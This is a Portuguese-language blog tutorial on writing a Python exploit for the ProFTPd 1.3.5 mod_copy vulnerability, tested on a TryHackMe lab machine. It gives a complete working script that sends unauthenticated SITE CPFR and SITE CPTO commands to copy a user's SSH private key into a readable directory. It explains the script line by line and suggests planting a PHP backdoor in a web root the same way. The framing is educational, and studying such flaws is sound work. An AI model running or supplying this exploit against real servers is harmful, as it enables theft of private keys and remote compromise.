+++
title = 'Proftpd Exploit'
date = 2024-04-24T00:47:56-03:00
draft = false
+++

# ProFTPd 1.3.5 mod_copy exploit

Opa, eai! Tudo certo? Vamos treinar a escrita de exploits?

Vamos escrever um simples exploit para a vulnerabilidade encontrada no **ProFTPd** na versão **1.3.5**.


_OBS: Obviamente não fui eu quem descobriu tal vulnerabilidade, este artigo tem como objetivo apenas treinar a escrita de exploits e juntar programação com hacking!_


> ### Sobre a vulnerabilidade...
>
> Bom, para você que não conhece essa vulnerabilidade ainda, basicamente, ela consiste no fato de qualquer cliente, mesmo não estando autenticado no servidor que está rodando essa versão vulnerável do ProFTPd, consegue executar dois comando do FTP: o `SITE CPFR ` e o `SITE CPTO`.
>
> ### Tá, mas eai?
>
> Esses comandos funcionam como o _CTRL+C_ e _CTRL+V,_ ou seja, quer dizer que com eles você pode copiar um arquivo de uma parte do servidor para outra de sua escolha. Ai, vai da criatividade do atacante. Ele pode usar isso para mover a backdoor PHP dele para o diretório root da aplicação web que está rodando no servidor e então conseguir executar comandos no servidor, por exemplo.

Beleza, agora que você já sabe vamos lá!

## O mindset

Poderíamos usar C/C++ para implementar este exploit, ou mesmo, outra línguagem que possua suporte a implementação de sockets de redes.

Mas, por questão de simplicidade e pensando em um ambiente onde você conheça a vulnerabilidade mas não tenha um exploit pronto em mãos e precise codar um, com a limitação de ter apenas um editor de textos e um interpretador do python na máquina, vamos codar em python.

Eu sei, talvez tenha sido muito específico, mas, quando o assunto é Red Team, precisamos pensar nas mais variadas possibilidades.

Vamos lá!

## O exploit

Para nos aproveitarmos desta vulnerabilidade, precisamos apenas nos conectar na porta a qual o software FTP vulnerável está executando e então enviarmos os comandos para serem processados pelo software vulnerável.

_Neste cenário, eu usarei a sala **Kenobi** do **TryHackMe** para testar nossos código, pois ela já tem esta versão vulnerável do software executando, caso você queira treinar, te aconselho a fazer o mesmo!_

Aqui está o código já criado:

```python
import argparse
import socket
import sys


def exploit(target, port):
    print("[*] Exploiting...")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))

    banner = client.recv(1024).decode()

    print(banner)

    client.send(b"SITE CPFR /home/kenobi/.ssh/id_rsa\r\n")
    ans = client.recv(1024).decode()

    print(ans)

    client.send(b"SITE CPTO /var/tmp/id_rsa\r\n")
    ans = client.recv(1024).decode()

    print(ans)

    print("[+] Success!")


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="IP target")
    parser.add_argument("-p", "--port", help="Port target")

    args = parser.parse_args()

    if not args.target:
        print("[ERROR] Specify the target")
        return

    else:
        if args.port:
            target = args.target
            port = args.port

            exploit(target, port)

        else:
            target = args.target
            port = 21
            exploit(target, port)


if __name__ == "__main__":
    main()
```
Dividimos esse exploit em duas funções: a `main` e a `exploit`

Vamos para a função `exploit`.

### def exploit

Vemos logo de início que esta função recebe dois parâmetros: `target` e `port` que correspondem as informações sobre o servidor alvo.

Após printarmos uma mensagem na tela, começamos criando nosso socket cliente que irá conectar ao servidor FTP vulnerável:

```python
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
Após isso, usamos esse socket criado para nos conectarmos ao servidor, usando as informações passadas para a função:

```python
client.connect((target, port))
```

Assim que a conexão é estabelecida, recebemos o banner que o software FTP apresenta sempre que ele recebe uma nova conexão:

```python
banner = client.recv(1024).decode()
```

Usamos o método `decoder()` pois, do socket recebemos bytes puros, que precisam ser decodificados em um formato que entendamos.

Após receber o banner, printarmos ele, já decodificado:

```python
print(banner)
```
Agora, podemos enviar o comando que irá copiar o arquivo desejado, que neste exemplo é a chave _id_rsa_ do usuário **kenobi** da máquina.

```python
client.send(b"SITE CPFR /home/kenobi/.ssh/id_rsa\r\n")
```
Como estamos lidando com um socket de rede, os dados que trafegam por ele são apenas bytes, por isso colocamos a mensagem entre aspas com um **"b"** na frente. Isso indica para o python tratar a string entre aspas como bytes.

Precisamos também adicionar uma `\r\n` indicando o fim do comando para o software FTP.

Após isso, precisamos receber a resposta da execução desse comando no servidor:

```python
ans = client.recv(1024).decode()
```
Agora printarrmos a resposta do servidor:

```python
print(ans)
```
E repetiremos o processo anterior mas agora enviando o comando para colar a chave no nosso local desejado, que no nosso cenário aqui é o diretório `/tmp` do servidor e então já receberemos a resposta:

```python
client.send(b"SITE CPTO /var/tmp/id_rsa\r\n")
ans = client.recv(1024).decode()
```
E mais uma vez printaremos a resposta do servidor:

```python
print(ans)
```
Após isso, apenas informamos que a execução ocorreu com sucesso.

### def main()
Começamos criando o parser para fazer o parsing dos parâmetros que serão passafos para o nosso exploit:

```python
parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="IP target")
    parser.add_argument("-p", "--port", help="Port target")
```
Nosso exploit terá dois parâmetros: `-t/--target` e `-p/--port`, um específica o IP alvo e o outro a porta na qual o FTP está executando no servidor. Geralmente é 21.

Após isso, pegarmos os argumentos passados:

```python
args = parser.parse_args()
```
E, para evitamos erros, adicionamos uma checagem para saber se o alvo foi especificado, caso não, o exploit avisa e encerra a execução:

```python
    if not args.target:
        print("[ERROR] Specify the target")
        return
```

O alvo sendo especificado, entramos no bloco else, e já entramos em mais uma checagem. Mas, desta vez é para saber se uma porta foi especificada, caso não, a porta padrão (21) será usada. E então chamarmos a função `exploit()` explorando a vulnerabilidade:

```python
    else:
        if args.port:
            target = args.target
            port = args.port

            exploit(target, port)

        else:
            target = args.target
            port = 21
            exploit(target, port)
```
Agora, fazemos mais uma checagem:

```python
if __name__ == "__main__":
    main()
```
Se o exploit for o módulo principal, executarmos ele.

## Resultados

Veja o diretório `/tmp` antes da execução:

![ls](https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/ls.png)

Aqui está um exemplo da execução do exploit:

![exploit-run](https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/exploit-run.png)

Veja agora a presença da `id_rsa` no diretório:

![id_rsa](https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/id_rsa.png)

# Concluindo

Veja que não foi tão complexo assim. Sei que não se trata de uma vulnerabilidade tão conhecida, talvez seja até um pouco difícil encontrá-la em um ambiente real, mas, aproveite e treine, tente customizar esse exploit, melhorá-lo, use sua criatividade!

_Muito obrigado!_
_Fique com Deus!_
